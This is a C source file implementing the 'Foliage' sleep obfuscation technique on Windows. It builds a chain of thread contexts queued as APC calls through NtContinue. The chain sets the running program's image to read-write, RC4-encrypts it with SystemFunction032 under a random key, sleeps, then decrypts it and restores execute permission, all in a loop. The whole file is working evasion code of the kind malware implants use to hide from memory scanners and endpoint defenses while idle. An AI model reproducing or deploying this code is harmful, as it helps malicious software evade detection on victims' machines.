/*
 * Foliage Sleep Obfuscation method
 * Instead of using timer APIs, we are using now NtQueueApocThread syscall
 */
#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <intrin.h>
#include "Structs.h"
#define C_PTR( x ) ( PVOID )    x
#define U_PTR( x ) ( UINT_PTR ) x

// Init structure
BOOL InitStruct(_Out_ PWIN32_API pWin32Apis) {
    HMODULE hNtdll = {0};

    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
        printf("[-] GetModuleHandleA Failed with Error: %ld\n", GetLastError());
        return FALSE;
    }

    pWin32Apis->NtCreateEvent = GetProcAddress(hNtdll, "NtCreateEvent");
    pWin32Apis->NtWaitForSingleObject = GetProcAddress(hNtdll, "NtWaitForSingleObject");
    pWin32Apis->NtSignalAndWaitForSingleObject = GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
    pWin32Apis->NtCreateThreadEx = GetProcAddress(hNtdll, "NtCreateThreadEx");
    pWin32Apis->NtGetContextThread = GetProcAddress(hNtdll, "NtGetContextThread");
    pWin32Apis->NtTestAlert = GetProcAddress(hNtdll, "NtTestAlert");
    pWin32Apis->NtQueueApcThread = GetProcAddress(hNtdll, "NtQueueApcThread");
    pWin32Apis->NtAlertResumeThread = GetProcAddress(hNtdll, "NtAlertResumeThread");
    pWin32Apis->NtContinue = GetProcAddress(hNtdll, "NtContinue");
    pWin32Apis->SystemFunction032 = GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    return TRUE;
}

// Random key generation for encrypting memory
ULONG Random32() {
    UINT32 Seed = 0;

    _rdrand32_step(&Seed);

    return Seed;
}

VOID FoliageMethod(_In_ PWIN32_API pWin32Api, _In_ ULONG dwTimeOut) {
    NTSTATUS Status = { 0 };
    STRING   Key = { 0 };
    STRING   Img = { 0 };
    BYTE     Rnd[16] = { 0 };
    CONTEXT  Ctx[7] = { 0 };
    CONTEXT  CtxInit = { 0 };
    HANDLE   EvntSync = { 0 };
    ULONG    Protect = { 0 };
    HANDLE   Thread = { 0 };
    PVOID    ImageBase = { 0 };
    ULONG    ImageSize = { 0 };


    // Generate a new key by filling the Rnd array with random bytes
    for (int i = 0; i < 16; i++) {
        Rnd[i] = (BYTE)Random32(); // Random32() is assumed to generate a random 32-bit integer
    }

    // Get the base address of the current module 
    Img.Buffer = ImageBase = GetModuleHandleA(NULL);
    // Calculate the size of the image by accessing the NT headers
    Img.Length = ImageSize = ((PIMAGE_NT_HEADERS)(U_PTR(Img.Buffer) + ((PIMAGE_DOS_HEADER)Img.Buffer)->e_lfanew))->OptionalHeader.SizeOfImage;

    // Set the key buffer and length
    Key.Buffer = (PCHAR)Rnd;  // Assign the random bytes as the key buffer
    Key.Length = sizeof(Rnd); // Set the key length to the size of the random bytes array

    // Print the base address and size of the image
    printf("[+] Image 0x%p [%lu bytes]\n", ImageBase, ImageSize);
    // Print the address and size of the key
    printf("[+] Key   0x%p [%d bytes]\n", Key.Buffer, Key.Length);

    // Create a synchronization event using NtCreateEvent
    if (!NT_SUCCESS(Status = pWin32Api->NtCreateEvent(&EvntSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
        printf("[-] NtCreateEvent Failed with Error: %lx\n", Status);
        goto _CleanUp; // If creation fails, print error and exit
    }

    // Create a new thread using NtCreateThreadEx with suspended state
    if (!NT_SUCCESS(Status = pWin32Api->NtCreateThreadEx(&Thread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL))) {
        printf("[-] NtCreateThreadEx Failed with Error: %lx\n", Status);
        goto _CleanUp; // If creation fails, print error and exit
    }
    
    printf("[+] Thread created: 0x%p\n", Thread);

    // Dereference Rsp and set the value at that memory location to the address of NtTestAlert
    *(PVOID*)CtxInit.Rsp = pWin32Api->NtTestAlert;

    // Prepare the ROP chain by copying the initial context into each element of the context array 
    for (int i = 0; i < ARRAYSIZE(Ctx); i++) {
        memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
    }

    // Wait till EvntSync gets triggered
    Ctx[0].Rip = U_PTR(pWin32Api->NtWaitForSingleObject);
    Ctx[0].Rcx = U_PTR(EvntSync);
    Ctx[0].Rdx = U_PTR(FALSE);
    Ctx[0].R8 = U_PTR(NULL);

    // Change image protection from execute to RW only
    Ctx[1].Rip = U_PTR(VirtualProtect);
    Ctx[1].Rcx = U_PTR(ImageBase);
    Ctx[1].Rdx = U_PTR(ImageSize);
    Ctx[1].R8 = U_PTR(PAGE_READWRITE);
    Ctx[1].R9 = U_PTR(&Protect);

    // Encrypt the memory
    Ctx[2].Rip = U_PTR(pWin32Api->SystemFunction032);
    Ctx[2].Rcx = U_PTR(&Img);
    Ctx[2].Rdx = U_PTR(&Key);

    // Delay execution (sleep)
    Ctx[3].Rip = U_PTR(WaitForSingleObjectEx);
    Ctx[3].Rcx = U_PTR(GetCurrentProcess());
    Ctx[3].Rdx = U_PTR(dwTimeOut);
    Ctx[3].R8 = U_PTR(FALSE);

    // Decrypt the memory 
    Ctx[4].Rip = U_PTR(pWin32Api->SystemFunction032);
    Ctx[4].Rcx = U_PTR(&Img);
    Ctx[4].Rdx = U_PTR(&Key);

    // Change back memory back to be executable
    Ctx[5].Rip = U_PTR(VirtualProtect);
    Ctx[5].Rcx = U_PTR(ImageBase);
    Ctx[5].Rdx = U_PTR(ImageSize);
    Ctx[5].R8 = U_PTR(PAGE_EXECUTE_READ);
    Ctx[5].R9 = U_PTR(&Protect);

    // Exit thread
    Ctx[6].Rip = U_PTR(ExitThread);
    Ctx[6].Rcx = U_PTR(0);

    printf("[+] Queue up apc calls\n");

    // Queue APC (Asynchronous Procedure Call) calls for each context
    for (int i = 0; i < ARRAYSIZE(Ctx); i++) {
        if (!NT_SUCCESS(Status = pWin32Api->NtQueueApcThread(Thread, C_PTR(pWin32Api->NtContinue), &Ctx[i], FALSE, NULL))) {
            printf("[!] NtQueueApcThread Failed with Error: %lx\n", Status);
            goto _CleanUp; // If queuing fails, print error and jump to cleanup
        }
    }

    // Initiate sleep obfuscation by resuming the thread in an alertable state
    if (!NT_SUCCESS(Status = pWin32Api->NtAlertResumeThread(Thread, NULL))) {
        printf("[!] NtAlertResumeThread Failed with Error: %lx\n", Status);
        goto _CleanUp; // If resuming the thread fails, print error and jump to cleanup
    }

    printf("[*] Trigger obfuscation\n");

    // Trigger sleep obfuscation and wait for the event to be signaled
    if (!NT_SUCCESS(Status = pWin32Api->NtSignalAndWaitForSingleObject(EvntSync, Thread, TRUE, NULL))) {
        printf("[!] NtSignalAndWaitForSingleObject Failed with Error: %lx\n", Status);
        goto _CleanUp; // If signaling and waiting fails, print error and jump to cleanup
    }

    printf("[*] Obfuscation finished\n");

    // Clean up resources
    _CleanUp:
    if (EvntSync) {
        CloseHandle(EvntSync);
        EvntSync = NULL; // Close the event handle and set it to NULL
    }

    if (Thread) {
        CloseHandle(Thread);
        Thread = NULL; // Close the thread handle and set it to NULL
    }
}

int main() {
    WIN32_API Win32API = {0};
    ULONG dwDelay = 3000; //secs

    printf("[*] Using the Foliage Sleep Obfuscation Technique ... \n\n");

    if (!InitStruct(&Win32API)) {
        puts("[!] Failed to initialize win32 api");
        return -1;
    }


    while (TRUE) {
        FoliageMethod(&Win32API, dwDelay);
    }

    return 0;
}
